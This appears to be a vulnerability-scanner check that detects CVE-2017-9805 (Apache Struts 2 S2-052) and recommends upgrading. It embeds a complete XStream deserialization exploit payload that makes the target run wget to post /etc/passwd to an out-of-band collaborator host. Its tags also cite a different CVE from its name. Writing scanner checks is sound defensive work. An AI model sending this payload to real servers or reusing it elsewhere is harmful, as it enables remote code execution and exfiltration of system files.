metadata:
    language: v2-beta
    name: "CVE-2017-9805 Apache Struts 2 - Remote Command Execution detected (S2-052)"
    description: "Apache Struts 2 - Remote Command Execution (S2-052)"
    author: "lUcgryy"
    tags: "Apache Struts", "CVE-2017-5638", "cve"

define:
    issueDetail = `CVE-2017-9805 Apache Struts 2 - Remote Command Execution detected (S2-052)`
    issueRemediation = "Upgrade to Struts 2.5.13 or Struts 2.3.34"
    payload= `<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>wget</string><string>--post-file</string><string>/etc/passwd</string><string>{generate_collaborator_address()}</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>asdasd</name></filter><next class="string">asdasd</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>`
given host then
    send request:
        method: "POST"
        appending headers:
            "Content-Type": "application/xml"
        replacing body: {payload}
    if (dns interactions or http interactions) or ({latest.response.status_code} is 500 and (("Debugging information" in {latest.response}) and ("com.thoughtworks.xstream.converters.collections.MapConverter" in {latest.response}))) then
        report issue:
            severity: high
            confidence: certain
            detail: `{issueDetail}`
            remediation: `{issueRemediation}`
    end if
        